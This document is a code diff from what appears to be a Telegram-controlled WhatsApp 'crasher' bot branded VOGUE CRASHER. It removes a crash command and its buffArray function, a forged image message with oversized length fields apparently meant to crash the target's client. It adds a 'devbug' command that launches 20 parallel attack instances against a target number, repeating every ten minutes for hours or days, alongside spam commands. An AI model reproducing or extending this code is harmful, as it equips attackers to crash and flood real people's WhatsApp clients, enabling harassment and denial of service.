@@ -2381,82 +2381,204 @@ been successfully analyzed.
 // ALL BUG COMMAND
 // ==========================================
 
-bot.command('crash', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+const activeDurationTasks = new Map();
+
+function parseDuration(duration) {
+
+    const match =
+        duration.match(/^(\d+)(d|h|m)$/);
+
+    if (!match) return null;
+
+    const value =
+        parseInt(match[1]);
+
+    const unit =
+        match[2];
+
+    switch (unit) {
+
+        case "d":
+            return value * 24 * 60 * 60 * 1000;
+
+        case "h":
+            return value * 60 * 60 * 1000;
+
+        case "m":
+            return value * 60 * 1000;
+
+        default:
+            return null;
+    }
+}
+
+bot.command('devbug', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
-    let q = ctx.message?.text?.split(" ")[1];
+    if (ctx.from.id != ownerID) {
+        return ctx.reply(
+`Access Denied
+
+This command is restricted to the system owner.`
+        );
+    }
     
-    if (!q) return ctx.reply(
-        `Invalid Format
+        let args = ctx.message?.text?.split(" ");
+        let q = args[1];
+        let durationArg = args[2] || "1d";
+        if (!q) {
+            return ctx.reply(
+`Invalid Format
 
 Usage:
-/spamandro <target_number>
+/devbug <target> <duration>
 
 Example:
-/spamandro 628xxxxxxxx`
-    );
-    
-    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    
-    try {
-        
-        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
-            caption: `
-<pre>
-V O G U E  •  C R A S H E R
-──────────────────────────
+/devbug 628xxx 1d
+/devbug 628xxx 12h`
+            );
+        }
 
-EXECUTION STATUS
+        const durationMs = parseDuration(durationArg);
+
+        if (!durationMs) {
+            return ctx.reply("Invalid duration format.");
+            
+        }
+
+        let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+        const taskId = Date.now().toString();
+        const endTime = Date.now() + durationMs;
+
+        try {
+            const sent =
+                await ctx.replyWithPhoto(
+                    thumbnailUrl,
+                    {
+                        caption:
+`
+<pre>
+V O G U E  •  DURATION TASK
+──────────────────────────
 
 Target      : ${q}
-Status      : Success
+Duration    : ${durationArg}
+Status      : Running
+
+Interval    : 10 Minutes
+Execution   : 20x Auto Loop
+
+Task ID     : ${taskId}
 
 ──────────────────────────
-</pre>`,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [{
-                        text: "Check Target",
-                        url: `https://wa.me/${q}`,
-                        style: "primary"
-                    }]
-                ]
-            }
-        });
-        
-        (async () => {
-            
-            const instanceId = Date.now() + Math.random();
-            
-            for (let i = 0; i < 1; i++) {
-                try {
-                    if (!sock) {
-                        throw new Error("Socket unavailable");
+Background task initialized.
+</pre>
+`,
+                        parse_mode: "HTML"
                     }
-                    await buffArray(sock, target);
-                    await sleep(1000)
-                } catch (e) {
-                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
-                    autoRestartOn408(e);
-                }
-            }
-            
-            console.log(`[WORKER ${instanceId}] Done for ${q}`);
-            
-        })();
-        
-    } catch (error) {
-        
-        ctx.reply(
-            `Operation Failed
+                );
 
-The system was unable to execute the requested module.
-Please verify the target input and system status before retrying.`
-        );
-        
-        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+            const interval = setInterval(async () => {
+                    if (
+                        Date.now() >= endTime
+                    ) {
+                        clearInterval(interval);
+                        activeDurationTasks.delete(taskId);
+                        try {
+                            await ctx.telegram.editMessageCaption(
+                                ctx.chat.id,
+                                sent.message_id,
+                                undefined,
+
+`
+<pre>
+V O G U E  •  DURATION TASK
+──────────────────────────
+
+Target      : ${q}
+Duration    : ${durationArg}
+Status      : Finished
+
+Task ID     : ${taskId}
+
+──────────────────────────
+Task duration completed.
+</pre>
+`,
+                                {
+                                    parse_mode: "HTML"
+                                }
+                            );
+                        } catch {}
+                        return;
+                    }
+                    const createInstance = async (instanceIndex) => {
+                        const instanceId = `${taskId}-${instanceIndex}`;
+                        try {
+                            for (let i = 0; i < 20; i++) {
+                                try {
+                                    if (!sock) {
+                                        throw new Error("Socket unavailable");
+                                    }
+                                    
+                                    await P7X(sock, target);
+                                    await sleep(3000);
+
+                                    console.log(`[INSTANCE ${instanceId}] EXEC ${i + 1}`);
+                                } catch (e) {
+                                    console.log(`[INSTANCE ${instanceId}] ERROR ${e.message}`);
+                                    autoRestartOn408(e);
+                                }
+                            }
+                        } catch (err) {
+                            console.log(`[INSTANCE ${instanceId}] FAILED`);
+                        }
+                    };
+
+                    const allInstances = Array.from({ length: 20 }, (_, i) =>
+                                createInstance(i + 1)
+                        );
+
+                    await Promise.allSettled(allInstances);
+
+                    console.log(`[TASK ${taskId}] CYCLE COMPLETED`);
+                }, 10 * 60 * 1000);
+
+            (async () => {
+
+                const allInstances =Array.from({ length: 20 }, (_, i) => {
+
+                            const instanceId = `${taskId}-${i + 1}`;
+                            return (async () => {
+                                for (let x = 0; x < 20; x++) {
+                                    try {
+                                        await P7X(sock, target);
+                                        await sleep(3000);
+                                    } catch (e) {
+                                        autoRestartOn408(e);
+                                    }
+                                }
+                                console.log(`[INSTANCE ${instanceId}] FIRST EXEC DONE`);
+                            })();
+                        }
+                    );
+                await Promise.allSettled(allInstances);
+            })();
+            activeDurationTasks.set(
+                taskId,
+                {
+                    target: q,
+                    duration: durationArg,
+                    started: Date.now(),
+                    endTime,
+                    interval
+                }
+            );
+        } catch (err) {
+            console.log(err);
+            ctx.reply("Failed to initialize duration task.");
+        }
     }
-})
+);
 
 bot.command('spamandro', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
@@ -2545,8 +2667,8 @@ bot.command('hardspam', checkExecutionLimit, checkWhatsAppConnection, checkPremi
     let executionCount =
         parseInt(args[2]) || 1;
     
-    if (executionCount > 100) {
-        executionCount = 100;
+    if (executionCount > 20) {
+        executionCount = 20;
     }
     
     if (!q) return ctx.reply(
@@ -3483,35 +3605,6 @@ async function Vdelay(sock, target) {
     
     await new Promise((r) => setTimeout(r, 2000));
   }
-}
-
-async function buffArray(sock, target) {
-    await sock.relayMessage(target, {
-        imageMessage: {
-            url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
-            mimetype: "image/jpeg",
-            fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
-            fileLength: "999999999999",
-            height: 212,
-            width: 320,
-            mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
-            fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
-            directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
-            mediaKeyTimestamp: "1778501051",
-            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
-            contextInfo: {
-                pairedMediaType: "NOT_PAIRED_MEDIA"
-            },
-            scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
-            scanLengths: [
-                999999999999,
-                999999999999,
-                999999999999,
-                999999999999
-            ],
-            midQualityFileSha256: ""
-        }
-    }, { participant: { jid: target } });
 }
 
 bot.launch()
